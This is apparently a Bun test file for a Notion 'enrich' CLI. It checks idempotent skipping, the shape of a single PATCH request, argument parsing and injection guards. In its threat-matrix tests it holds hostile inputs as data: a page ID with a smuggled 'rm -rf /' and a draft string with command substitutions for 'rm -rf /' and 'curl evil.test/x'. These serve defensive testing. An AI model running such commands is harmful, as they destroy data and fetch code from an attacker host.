import { describe, expect, test } from "bun:test";
import { NOTION_API_BASE } from "../src/notion-writer.ts";
import { parseEnrichArgs, runEnrich } from "../src/resolver/enrich.ts";

// All Notion interactions go through an injected fetch fake and the draft
// arrives through an injected file reader: zero live API calls, zero
// credentials, zero temp files. Under test are the skip predicate, the
// single-PATCH write shape and the pre-flight guards (tasks 1.1–1.3).

const PAGE_ID = "11111111-2222-3333-4444-555555555555";

function jsonResponse(data: unknown, status = 200): Response {
	return new Response(JSON.stringify(data), {
		status,
		headers: { "Content-Type": "application/json" },
	});
}

type RecordedCall = { url: string; init: RequestInit };

function recorder(
	handler: (url: string, init: RequestInit) => Promise<Response> | Response,
) {
	const calls: RecordedCall[] = [];
	const fetch = (input: string | URL | Request, init?: RequestInit) => {
		const url = typeof input === "string" ? input : input.toString();
		const record = { url, init: init ?? {} };
		calls.push(record);
		return Promise.resolve(handler(url, record.init));
	};
	return { fetch, calls };
}

function richText(content: string) {
	return {
		type: "rich_text",
		rich_text: content === "" ? [] : [{ plain_text: content, text: { content } }],
	};
}

/** Page fixture carrying only what the idempotency predicate reads. */
function mkTaskPage(fields: { draftId?: string; resolution?: string; refs?: string }) {
	return {
		id: PAGE_ID,
		properties: {
			Título: { type: "title", title: [{ plain_text: "Revisar login SIS" }] },
			"Draft ID": richText(fields.draftId ?? ""),
			"Resolution Draft": richText(fields.resolution ?? ""),
			"Local Context Ref": richText(fields.refs ?? ""),
		},
	};
}

function depsWith(
	fetch: (input: string | URL | Request, init?: RequestInit) => Promise<Response>,
	draft: string,
) {
	return { fetchFn: fetch, token: "test-token", readText: async () => draft };
}

const ARGS = {
	pageId: PAGE_ID,
	status: "💡 Acción",
	draftFile: "draft.md",
	refs: "src/api.ts:10-42",
};

function ioCapture() {
	const lines: string[] = [];
	return { io: { print: (line: string) => lines.push(line) }, lines };
}

describe("enrich: idempotency predicate (Enrichment Idempotency)", () => {
	test("non-empty Resolution Draft ⇒ skipped, no PATCH", async () => {
		const { fetch, calls } = recorder(() =>
			jsonResponse(mkTaskPage({ resolution: "existing draft" })),
		);
		const { io, lines } = ioCapture();
		const report = await runEnrich(ARGS, depsWith(fetch, "new draft"), io);
		expect(report.outcome).toBe("skipped");
		expect(calls.length).toBe(1); // the idempotency GET only
		expect(calls[0]!.init.method).toBe("GET");
		expect(lines.join("\n")).toContain("skipped");
	});

	test("v1-shaped page with Draft ID present ⇒ skipped (OR predicate)", async () => {
		const { fetch, calls } = recorder(() =>
			jsonResponse(mkTaskPage({ draftId: "abc123def456" })),
		);
		const report = await runEnrich(ARGS, depsWith(fetch, "new draft"), ioCapture().io);
		expect(report.outcome).toBe("skipped");
		expect(calls.filter((call) => call.init.method === "PATCH").length).toBe(0);
	});

	test("empty-enrich: both predicate fields empty ⇒ exactly one PATCH", async () => {
		const { fetch, calls } = recorder(() => jsonResponse(mkTaskPage({})));
		const report = await runEnrich(ARGS, depsWith(fetch, "the draft"), ioCapture().io);
		expect(report.outcome).toBe("enriched");
		expect(calls.filter((call) => call.init.method === "PATCH").length).toBe(1);
		expect(calls.length).toBe(2); // GET + single atomic PATCH
	});

	test("cleared-fields retry: cleared fields re-enrich even with refs left over", async () => {
		const { fetch, calls } = recorder(() =>
			jsonResponse(mkTaskPage({ refs: "stale ref from partial run" })),
		);
		const report = await runEnrich(ARGS, depsWith(fetch, "fresh draft"), ioCapture().io);
		expect(report.outcome).toBe("enriched");
		expect(calls.filter((call) => call.init.method === "PATCH").length).toBe(1);
	});
});

describe("enrich: single triage PATCH shape (Direct Informational Enrichment)", () => {
	test("PATCH body carries exactly Triage Status + Resolution Draft + Local Context Ref", async () => {
		const { fetch, calls } = recorder(() => jsonResponse(mkTaskPage({})));
		await runEnrich(ARGS, depsWith(fetch, "the draft"), ioCapture().io);
		const patch = calls.find((call) => call.init.method === "PATCH")!;
		expect(patch.url).toBe(`${NOTION_API_BASE}/pages/${PAGE_ID}`);
		const body = JSON.parse(patch.init.body as string);
		expect(Object.keys(body.properties).sort()).toEqual([
			"Local Context Ref",
			"Resolution Draft",
			"Triage Status",
		]);
		expect(body.properties["Triage Status"]).toEqual({ select: { name: ARGS.status } });
		expect(body.properties["Resolution Draft"]).toEqual({
			rich_text: [{ text: { content: "the draft" } }],
		});
		expect(body.properties["Local Context Ref"]).toEqual({
			rich_text: [{ text: { content: ARGS.refs } }],
		});
		// Estado/Notas (fingerprint carriers) and v1 mirror fields never present.
		for (const forbidden of ["Estado", "Notas", "Approval State", "Draft ID"]) {
			expect(body.properties[forbidden]).toBeUndefined();
		}
	});

	test("draft longer than 2000 chars is refused pre-write", async () => {
		const { fetch, calls } = recorder(() => jsonResponse(mkTaskPage({})));
		const report = await runEnrich(ARGS, depsWith(fetch, "x".repeat(2001)), ioCapture().io);
		expect(report.outcome).toBe("refused");
		expect(calls.filter((call) => call.init.method === "PATCH").length).toBe(0);
	});
});

describe("enrich: process-integration boundary (threat matrix)", () => {
	test("malformed page_id refuses pre-flight with zero requests", async () => {
		const { fetch, calls } = recorder(() => jsonResponse(mkTaskPage({})));
		const report = await runEnrich(
			{ ...ARGS, pageId: "not-a-uuid; rm -rf /" },
			depsWith(fetch, "the draft"),
			ioCapture().io,
		);
		expect(report.outcome).toBe("refused");
		expect(calls.length).toBe(0);
	});

	test("draft with shell metacharacters is written verbatim and spawns nothing", async () => {
		const hostile = "$(rm -rf /); `curl evil.test/x`; && echo pwned";
		const { fetch, calls } = recorder(() => jsonResponse(mkTaskPage({})));
		const report = await runEnrich(ARGS, depsWith(fetch, hostile), ioCapture().io);
		expect(report.outcome).toBe("enriched");
		const patch = calls.find((call) => call.init.method === "PATCH")!;
		const body = JSON.parse(patch.init.body as string);
		expect(body.properties["Resolution Draft"].rich_text[0].text.content).toBe(hostile);
		expect(calls.length).toBe(2); // GET + PATCH — nothing else ran
	});

	test("token never arrives via argv: --token is a usage error", () => {
		expect(
			parseEnrichArgs([
				PAGE_ID,
				"--status",
				"💡 Acción",
				"--draft-file",
				"d.md",
				"--token",
				"stolen",
			]),
		).toBeNull();
	});
});

describe("enrich: argument parsing and status guard", () => {
	test("valid invocation parses; --refs optional", () => {
		expect(
			parseEnrichArgs([PAGE_ID, "--status", "💡 Acción", "--draft-file", "d.md"]),
		).toEqual({ pageId: PAGE_ID, status: "💡 Acción", draftFile: "d.md", refs: undefined });
		expect(
			parseEnrichArgs([PAGE_ID, "--status", "💡 Acción", "--draft-file", "d.md", "--refs", "r"])!
				.refs,
		).toBe("r");
	});

	test("missing required flags or extra positionals are usage errors", () => {
		expect(parseEnrichArgs([])).toBeNull();
		expect(parseEnrichArgs([PAGE_ID])).toBeNull();
		expect(
			parseEnrichArgs([PAGE_ID, "extra", "--status", "💡 Acción", "--draft-file", "d.md"]),
		).toBeNull();
	});

	test("status outside the hint set is refused pre-flight (fail closed)", async () => {
		const { fetch, calls } = recorder(() => jsonResponse(mkTaskPage({})));
		const report = await runEnrich(
			{ ...ARGS, status: "✔️ Hecho" },
			depsWith(fetch, "the draft"),
			ioCapture().io,
		);
		expect(report.outcome).toBe("refused");
		expect(calls.length).toBe(0);
	});
});
